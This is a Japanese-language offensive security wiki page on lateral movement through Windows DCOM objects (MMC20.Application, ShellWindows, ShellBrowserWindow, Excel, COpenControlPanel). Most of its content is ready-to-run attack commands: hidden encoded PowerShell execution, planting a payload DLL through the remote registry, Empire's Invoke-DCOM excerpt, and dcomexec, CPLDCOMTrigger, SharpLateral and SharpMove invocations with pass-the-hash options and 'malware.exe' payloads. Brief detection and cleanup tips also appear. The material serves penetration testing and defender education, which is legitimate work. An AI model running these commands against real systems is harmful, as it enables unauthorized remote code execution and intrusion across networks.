# DCOM Exec

{{#include ../../banners/hacktricks-training.md}}

DCOM lateral movement は、service や scheduled task を作成する代わりに、RPC/DCOM 経由で公開されている既存の COM servers を再利用できるため魅力的です。実際には、initial connection は通常 TCP/135 で開始され、その後、動的に割り当てられた高位の RPC ports に移行します。

## 前提条件と注意点

- 通常、target 上で local administrator context が必要であり、remote COM server が remote launch/activation を許可している必要があります。
- **2023 年 3 月 14 日**以降、Microsoft はサポート対象システムに対して DCOM hardening を適用しています。低い activation authentication level を要求する古い client は、少なくとも `RPC_C_AUTHN_LEVEL_PKT_INTEGRITY` まで negotiate できない場合、失敗する可能性があります。Modern Windows clients は通常自動的に引き上げられるため、現在の tooling は通常そのまま動作します。<sup>[[3]](#references)</sup>
- Manual または scripted DCOM execution には、通常 TCP/135 と target の dynamic RPC port range が必要です。Impacket の `dcomexec.py` を使用し、command output を取得したい場合は、通常 `ADMIN$`（または別の writable/readable share）への SMB access も必要です。
- RPC/DCOM は機能するものの SMB が block されている場合でも、`dcomexec.py -nooutput` は blind execution に役立ちます。

クイックチェック:
```bash
# Enumerate registered DCOM applications
Get-CimInstance Win32_DCOMApplication | Select-Object AppID, Name

# Useful to inspect firewall/RPC issues
Test-NetConnection -ComputerName 10.10.10.10 -Port 135
```
## MMC20.Application

この technique の詳細については、[original MMC20.Application post](https://enigma0x3.net/2017/01/05/lateral-movement-using-the-mmc20-application-com-object/)を参照してください。<sup>[[1]](#references)</sup>

Distributed Component Object Model (DCOM) objects は、network-based interactions with objects のための興味深い機能を提供します。Microsoft は DCOM と Component Object Model (COM) の両方について包括的な documentation を提供しており、[DCOMはこちら](https://msdn.microsoft.com/en-us/library/cc226801.aspx)、[COMはこちら](<https://msdn.microsoft.com/en-us/library/windows/desktop/ms694363(v=vs.85).aspx>)からアクセスできます。DCOM applications の一覧は、次の PowerShell command を使用して取得できます:
```bash
Get-CimInstance Win32_DCOMApplication
```
COM object である [MMC Application Class (MMC20.Application)](https://technet.microsoft.com/en-us/library/cc181199.aspx) を使用すると、MMC snap-in の操作を scripting できます。特に、この object には `Document.ActiveView` 配下に `ExecuteShellCommand` method が含まれています。この method の詳細については[こちら](<https://msdn.microsoft.com/en-us/library/aa815396(v=vs.85).aspx>)を参照してください。次のように実行して確認できます:<sup>[[6]](#references)</sup>

この機能により、DCOM application を介して network 経由で commands を実行できます。admin として DCOM に remote で interact するには、PowerShell を次のように利用できます:
```bash
[activator]::CreateInstance([type]::GetTypeFromProgID("<DCOM_ProgID>", "<IP_Address>"))
```
このコマンドは DCOM アプリケーションに接続し、COM オブジェクトのインスタンスを返します。その後、ExecuteShellCommand メソッドを呼び出して、リモートホスト上でプロセスを実行できます。プロセスには次の手順が含まれます。

メソッドを確認:
```bash
$com = [activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.Application", "10.10.10.10"))
$com.Document.ActiveView | Get-Member
```
RCEを取得:
```bash
$com = [activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.Application", "10.10.10.10"))
$com.Document.ActiveView.ExecuteShellCommand(
"cmd.exe",
$null,
"/c powershell -NoP -W Hidden -Enc <B64>",
"7"
)
```
最後の引数はウィンドウスタイルです。`7` にすると、ウィンドウは最小化された状態になります。運用上、MMCベースの実行では、通常、リモートの `mmc.exe` プロセスがペイロードを生成します。これは、以下の Explorer ベースのオブジェクトとは異なります。

## ShellWindows & ShellBrowserWindow

**この technique の詳細については、元の投稿 [https://enigma0x3.net/2017/01/23/lateral-movement-via-dcom-round-2/](https://enigma0x3.net/2017/01/23/lateral-movement-via-dcom-round-2/)**<sup>[[2]](#references)</sup>

**MMC20.Application** オブジェクトには明示的な「LaunchPermissions」がなく、Administrators にアクセスを許可する権限がデフォルトで設定されていることが確認されました。詳細については[こちら](https://twitter.com/tiraniddo/status/817532039771525120)のスレッドを参照できます。また、明示的な Launch Permission が設定されていないオブジェクトをフィルタリングするために、[@tiraniddo](https://twitter.com/tiraniddo) の OleView .NET を使用することが推奨されます。

`ShellBrowserWindow` と `ShellWindows` という2つのオブジェクトは、明示的な Launch Permissions がないため注目されました。`HKCR:\AppID\{guid}` 配下に `LaunchPermission` レジストリエントリが存在しない場合、明示的な権限が設定されていないことを示します。

`MMC20.Application` と比較すると、これらのオブジェクトは、OPSEC の観点ではより目立ちにくいことが多くあります。これは、リモートホスト上でコマンドが `mmc.exe` ではなく、通常 `explorer.exe` の子プロセスとして実行されるためです。

### ShellWindows

ProgID がない `ShellWindows` では、.NET のメソッド `Type.GetTypeFromCLSID` と `Activator.CreateInstance` を使用して、その AppID からオブジェクトをインスタンス化できます。この処理では、OleView .NET を利用して `ShellWindows` の CLSID を取得します。インスタンス化後は、`WindowsShell.Item` メソッドを介して操作でき、`Document.Application.ShellExecute` のようなメソッド呼び出しにつながります。

オブジェクトをインスタンス化し、リモートでコマンドを実行する PowerShell コマンドの例が示されています。
```bash
# Example
$com = [Type]::GetTypeFromCLSID("<clsid>", "<IP>")
$obj = [System.Activator]::CreateInstance($com)
$item = $obj.Item()
$item.Document.Application.ShellExecute("cmd.exe", "/c calc.exe", "c:\windows\system32", $null, 0)
```
### ShellBrowserWindow

`ShellBrowserWindow` は似ていますが、CLSID を介して直接インスタンス化し、`Document.Application.ShellExecute` へ pivot できます：
```bash
$com = [Type]::GetTypeFromCLSID("C08AFD90-F2A1-11D1-8455-00A0C91F3880", "10.10.10.10")
$obj = [System.Activator]::CreateInstance($com)
$obj.Document.Application.ShellExecute(
"cmd.exe",
"/c whoami > C:\\Windows\\Temp\\dcom.txt",
"C:\\Windows\\System32",
$null,
0
)
```
### Excel DCOM Objectsを使用したLateral Movement

DCOM Excel Objectsを悪用することで、Lateral Movementを実現できます。詳細については、[Cybereason's blog](https://www.cybereason.com/blog/leveraging-excel-dde-for-lateral-movement-via-dcom)の、DCOM経由でLateral Movementを行うためにExcel DDEを活用する方法に関する解説を読むことを推奨します。<sup>[[5]](#references)</sup>

Empire projectには、DCOM Objectsを操作してExcelをremote code execution (RCE)に利用する方法を示したPowerShell scriptが用意されています。以下は、[Empire's GitHub repository](https://github.com/EmpireProject/Empire/blob/master/data/module_source/lateral_movement/Invoke-DCOM.ps1)で公開されているscriptの抜粋で、ExcelをRCEに悪用するさまざまな方法を紹介しています。
```bash
# Detection of Office version
elseif ($Method -Match "DetectOffice") {
$Com = [Type]::GetTypeFromProgID("Excel.Application","$ComputerName")
$Obj = [System.Activator]::CreateInstance($Com)
$isx64 = [boolean]$obj.Application.ProductCode[21]
Write-Host  $(If ($isx64) {"Office x64 detected"} Else {"Office x86 detected"})
}
# Registration of an XLL
elseif ($Method -Match "RegisterXLL") {
$Com = [Type]::GetTypeFromProgID("Excel.Application","$ComputerName")
$Obj = [System.Activator]::CreateInstance($Com)
$obj.Application.RegisterXLL("$DllPath")
}
# Execution of a command via Excel DDE
elseif ($Method -Match "ExcelDDE") {
$Com = [Type]::GetTypeFromProgID("Excel.Application","$ComputerName")
$Obj = [System.Activator]::CreateInstance($Com)
$Obj.DisplayAlerts = $false
$Obj.DDEInitiate("cmd", "/c $Command")
}
```
最近の研究では、`Excel.Application` の `ActivateMicrosoftApp()` メソッドによって、この領域がさらに拡張されました。重要な点は、Excel がシステムの `PATH` を検索して、FoxPro、Schedule Plus、Project などのレガシー Microsoft アプリケーションの起動を試みることです。攻撃者が、これらの想定された名前のいずれかを持つ payload を、対象の `PATH` に含まれる書き込み可能な場所に配置できれば、Excel はそれを実行します。<sup>[[4]](#references)</sup>

このバリエーションの要件:

- 対象での Local admin
- 対象に Excel がインストールされていること
- 対象の `PATH` 内にある書き込み可能なディレクトリへ payload を書き込めること

FoxPro の lookup（`FOXPROW.exe`）を悪用する実用例:
```bash
copy C:\Windows\System32\calc.exe \\192.168.52.100\c$\Users\victim\AppData\Local\Microsoft\WindowsApps\FOXPROW.exe
$com = [System.Activator]::CreateInstance([type]::GetTypeFromProgID("Excel.Application", "192.168.52.100"))
$com.ActivateMicrosoftApp("5")
```
攻撃ホストにローカルの `Excel.Application` ProgID が登録されていない場合は、代わりに CLSID を使用してリモートオブジェクトをインスタンス化します。
```bash
$com = [System.Activator]::CreateInstance([type]::GetTypeFromCLSID("00020812-0000-0000-C000-000000000046", "192.168.52.100"))
$com.Application.ActivateMicrosoftApp("5")
```
実際に悪用されている値:

- `5` -> `FOXPROW.exe`
- `6` -> `WINPROJ.exe`
- `7` -> `SCHDPLUS.exe`

### COpenControlPanel — 登録済みの Control Panel DLL のロード

`COpenControlPanel` クラス (CLSID `{06622D85-6856-4460-8DE1-A81921B41C4B}`) は、`IOpenControlPanel` (IID `{D11AD862-66DE-4DF4-BF6C-1F5621996AF1}`) を公開します。このクラスの `Open()` メソッドにより、`Control Panel\Cpls` キーに登録された Control Panel DLL がリモートの `dllhost.exe` によってロードされます。テストしたシステムでは、このクラスに明示的な起動/アクセス権限が設定されていなかったため、デフォルトの DCOM ポリシーを継承します (通常、リモート activation には administrator 権限が必要です)。ランダムな item name だけで `Open()` に登録済み DLL を処理させることができます。payload に `.cpl` 拡張子は必要ありませんが、正しい architecture の有効な DLL である必要があります。<sup>[[7]](#references)</sup>

この primitive は **stage-and-trigger** であり、command-only execution ではありません。まず DLL を target にコピーして、それを指す `REG_EXPAND_SZ` value を作成し、その後 DCOM 経由で object を activate します。たとえば、administrative Windows context からは次のように実行します。<sup>[[7]](#references)</sup>
```cmd
copy payload.dll \\target\C$\Windows\Temp\panel.dll
reg.exe add "\\target\HKLM\Software\Microsoft\Windows\CurrentVersion\Control Panel\Cpls" /v Updater /t REG_EXPAND_SZ /d "C:\Windows\Temp\panel.dll" /f
```
公開されている [CPLDCOMTrigger](https://github.com/klsecservices/CPLDCOMTrigger) client は、Impacket を使用して undocumented な DCOM call を実装します。任意の Control Panel item name を指定するだけで十分です。`dllhost.exe` が DLL をロードしていても、client は RPC error を報告することがあります。<sup>[[8]](#references)</sup>
```bash
git clone https://github.com/klsecservices/CPLDCOMTrigger
cd CPLDCOMTrigger
python3 CPLTrig.py 'DOMAIN/user:password@target' -cpl random

# Pass-the-hash and Kerberos are also implemented
python3 CPLTrig.py 'DOMAIN/user@target' -hashes ':NTHASH' -cpl random
python3 CPLTrig.py 'DOMAIN/user@target.domain.local' -aesKey AES_KEY_HEX -dc-ip 10.10.10.10 -cpl random
```
運用上、この手法にはファイル書き込みチャネルとリモートレジストリへのアクセスも必要なため、`MMC20`/`ShellWindows` よりもノイズが多くなります。さらに、後で Control Panel を開くと同じエントリが再度読み込まれるため、persistence の副作用が発生します。実行後に値を削除し、予期しない `Control Panel\Cpls` の値と `dllhost.exe` での不審な DLL ロードを併せてハントしてください。<sup>[[7]](#references)</sup>
```cmd
reg.exe delete "\\target\HKLM\Software\Microsoft\Windows\CurrentVersion\Control Panel\Cpls" /v Updater /f
del \\target\C$\Windows\Temp\panel.dll
```
### Lateral Movement の Automation Tools

これらの technique を自動化するため、次の 2 つの tool が紹介されています。

- **Invoke-DCOM.ps1**: Empire project が提供する PowerShell script で、remote machine 上で code を実行するためのさまざまな method の invocation を簡略化します。この script は Empire GitHub repository から利用できます。

- **SharpLateral**: remote で code を実行するために設計された tool で、次の command で使用できます:
```bash
SharpLateral.exe reddcom HOSTNAME C:\Users\Administrator\Desktop\malware.exe
```
- [SharpMove](https://github.com/0xthirteen/SharpMove):
```bash
SharpMove.exe action=dcom computername=remote.host.local command="C:\windows\temp\payload.exe\" method=ShellBrowserWindow amsi=true
```
## Automatic Tools

- Powershell スクリプト [**Invoke-DCOM.ps1**](https://github.com/EmpireProject/Empire/blob/master/data/module_source/lateral_movement/Invoke-DCOM.ps1) を使用すると、commented されているすべての方法で、他のマシン上の code を簡単に実行できます。
- Impacket の `dcomexec.py` を使用すると、DCOM 経由で remote system 上の command を実行できます。現在の build は `ShellWindows`、`ShellBrowserWindow`、`MMC20` をサポートしており、デフォルトでは `ShellWindows` を使用します。
```bash
dcomexec.py 'DOMAIN'/'USER':'PASSWORD'@'target_ip' "cmd.exe /c whoami"

# Pick the object explicitly
dcomexec.py -object MMC20 'DOMAIN'/'USER':'PASSWORD'@'target_ip' "cmd.exe /c whoami"

# Blind execution when SMB/output retrieval is not available
dcomexec.py -object ShellBrowserWindow -nooutput 'DOMAIN'/'USER':'PASSWORD'@'target_ip' "cmd.exe /c calc.exe"
```
- [**SharpLateral**](https://github.com/mertdas/SharpLateral) も使用できます：
```bash
SharpLateral.exe reddcom HOSTNAME C:\Users\Administrator\Desktop\malware.exe
```
- [**SharpMove**](https://github.com/0xthirteen/SharpMove)も使用できます。
```bash
SharpMove.exe action=dcom computername=remote.host.local command="C:\windows\temp\payload.exe\" method=ShellBrowserWindow amsi=true
```
## References

- [1] [MMC20.Application COM Objectを使用したLateral Movement](https://enigma0x3.net/2017/01/05/lateral-movement-using-the-mmc20-application-com-object/)
- [2] [DCOM経由のLateral Movement：Round 2](https://enigma0x3.net/2017/01/23/lateral-movement-via-dcom-round-2/)
- [3] [KB5004442—Windows DCOM Server Security Feature Bypass（CVE-2021-26414）に関する変更の管理](https://support.microsoft.com/en-us/topic/kb5004442-manage-changes-for-windows-dcom-server-security-feature-bypass-cve-2021-26414-f1400b52-c141-43d2-941e-37ed901c769c)
- [4] [Lateral Movement：DCOM Excel ApplicationのPowerを悪用する](https://specterops.io/blog/2023/10/30/lateral-movement-abuse-the-power-of-dcom-excel-application/)
- [5] [DCOM経由のLateral MovementにExcel DDEを活用する](https://www.cybereason.com/blog/leveraging-excel-dde-for-lateral-movement-via-dcom)
- [6] [technet.microsoft.com - MMC Application Class（MMC20.Application）](https://technet.microsoft.com/en-us/library/cc181199.aspx)
- [7] [リモートコマンド実行にDCOM objectsを使用する](https://securelist.com/lateral-movement-via-dcom-abusing-control-panel/118232/)
- [8] [CPLDCOMTrigger](https://github.com/klsecservices/CPLDCOMTrigger)
{{#include ../../banners/hacktricks-training.md}}
